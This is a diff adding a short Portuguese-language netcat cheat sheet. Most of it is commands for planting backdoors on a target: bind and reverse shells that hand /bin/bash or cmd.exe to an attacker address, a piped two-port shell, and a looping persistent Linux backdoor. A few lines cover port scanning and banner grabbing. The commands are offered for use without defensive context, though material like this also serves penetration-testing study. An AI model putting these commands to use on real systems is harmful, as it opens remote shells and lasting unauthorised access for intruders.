@@ -1,0 +1,31 @@
+### UTILIZAÇÃO DO NETCAT ###
+
+Criar Backdoor
+
+BIND
+Alvo -> nc -v -l -p 123 -e /bin/bash
+Atacante -> nc -v IPDOALVO 123
+
+REVERSE
+Atacante -> nc -l -p 123 -vv
+Alvo -> nc.exe IPDOATACANTE 123 -e cmd.exe
+
+Atacante -> nc -v -l -p 123
+Atacante -> nc -v -l -p 456
+Alvo -> nc.exe IPDOATACANTE 123 | cmd.exe | nc.exe IPDOATACANTE 456
+
+PERSISTENTE (LINUX)
+Alvo -> while true; do nc -v -l -p 123 -e /bin/bash; done
+Atacante -> nc -vv IPDOALVO 123
+
+VARREDURA DE PORTAS
+nc -v IPDOALVO -z 21-80
+
+LOCALIZAÇÃO DO NETCAT NO KALI LINUX
+/usr/share/windows-binaries/nc.exe
+
+LEITURA DE BANNERS
+nc IPDOALVO PORTA
+GET / HTTP/1.1
+HEAD /
+
